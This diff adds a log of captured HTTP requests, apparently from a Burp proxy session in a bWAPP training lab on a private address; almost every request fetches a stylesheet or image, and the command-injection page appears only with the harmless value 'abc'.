@@ -1,0 +1,3585 @@
+GET /css?family=Architects+Daughter HTTP/1.1
+Host: fonts.googleapis.com
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: text/css,*/*;q=0.1
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: style
+Referer: http://192.168.118.128/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
